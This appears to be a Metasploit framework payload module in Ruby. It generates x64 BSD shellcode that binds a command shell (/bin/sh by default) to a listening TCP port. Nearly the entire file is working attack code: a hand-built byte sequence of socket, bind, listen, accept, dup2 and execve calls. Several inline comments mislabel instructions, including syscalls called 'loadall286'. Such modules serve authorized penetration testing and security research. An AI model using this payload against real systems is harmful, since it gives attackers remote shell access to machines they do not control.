##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'

module MetasploitModule

  CachedSize = 136

  include Msf::Payload::Single
  include Msf::Payload::Bsd
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSD x64 Shell Bind TCP',
      'Description'   => 'Bind an arbitrary command to an arbitrary port',
      'Author'        => [
        'nemo <nemo[at]felinemenace.org>',
        'joev'
      ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix
    ))

    # exec payload options
    register_options(
      [
        OptString.new('CMD',  [ true,  "The command string to execute", "/bin/sh" ]),
        Opt::LPORT(4444)
    ])
  end

  # build the shellcode payload dynamically based on the user-provided CMD
  def generate
    cmd  = (datastore['CMD'] || '') + "\x00"
    port = [datastore['LPORT'].to_i].pack('n')
    call = "\xe8" + [cmd.length].pack('V')
    payload =
      "\x31\xc0" +                 # xor eax,eax
      "\x83\xc0\x61" +             # add eax,0x61
      "\x6A\x02" +                 # push byte 0x1
      "\x5f" +                     # pop rdi
      "\x6A\x01" +                 # push byte 0x1
      "\x5e" +                     # pop rsi
      "\x48\x31\xD2" +             # xor rdx,rdx
      "\x0F\x05" +                 # loadall286
      "\x48\x89\xC7" +             # mov rdi,rax
      "\x31\xc0" +                 # xor eax,eax
      "\x83\xc0\x68" +             # add eax,0x68
      "\x48\x31\xF6" +             # xor rsi,rsi
      "\x56" +                     # push rsi
      "\xBE\x00\x02" + port +      # mov esi,0xb3150200
      "\x56" +                     # push rsi
      "\x48\x89\xE6" +             # mov rsi,rsp
      "\x6A\x10" +                 # push 0x10
      "\x5A" +                     # pop rdx
      "\x0F\x05" +                 # loadall286
      "\x31\xc0" +                 # xor eax,eax
      "\x83\xc0\x6A" +             # add eax,0x6a
      "\x48\x31\xF6" +             # xor rsi,rsi
      "\x48\xFF\xC6" +             # inc rsi
      "\x49\x89\xFC" +             # mov r12,rdi
      "\x0F\x05" +                 # loadall286
      "\x31\xc0" +                 # xor eax,eax
      "\x83\xc0\x1E" +             # add eax,0x1e
      "\x4C\x89\xE7" +             # mov rdi,r12
      "\x48\x89\xE6" +             # mov rsi,rsp
      "\x48\x89\xE2" +             # mov rdx,rsp
      "\x48\x83\xEA\x04" +         # sub rdx,byte +0x4
      "\x0F\x05" +                 # loadall286
      "\x48\x89\xC7" +             # mov rdi,rax
      "\x31\xc0" +                 # xor eax,eax
      "\x83\xc0\x5A" +             # add eax,0x5a
      "\x48\x31\xF6" +             # xor rsi,rsi
      "\x0F\x05" +                 # loadall286
      "\x31\xc0" +                 # xor eax,eax
      "\x83\xc0\x5A" +             # add eax,0x5a
      "\x48\xFF\xC6" +             # inc rsi
      "\x0F\x05" +                 # loadall286
      "\x48\x31\xC0" +             # xor rax,rax
      "\x31\xc0" +                 # xor eax,eax
      "\x83\xc0\x3b" +             # add eax,0x3b
      call +                       # call CMD.len
      cmd +                        # CMD
      "\x48\x8b\x3c\x24" +         # mov rdi, [rsp]
      "\x48\x31\xD2" +             # xor rdx,rdx
      "\x52" +                     # push rdx
      "\x57" +                     # push rdi
      "\x48\x89\xE6" +             # mov rsi,rsp
      "\x0F\x05"                   # loadall286
  end
end
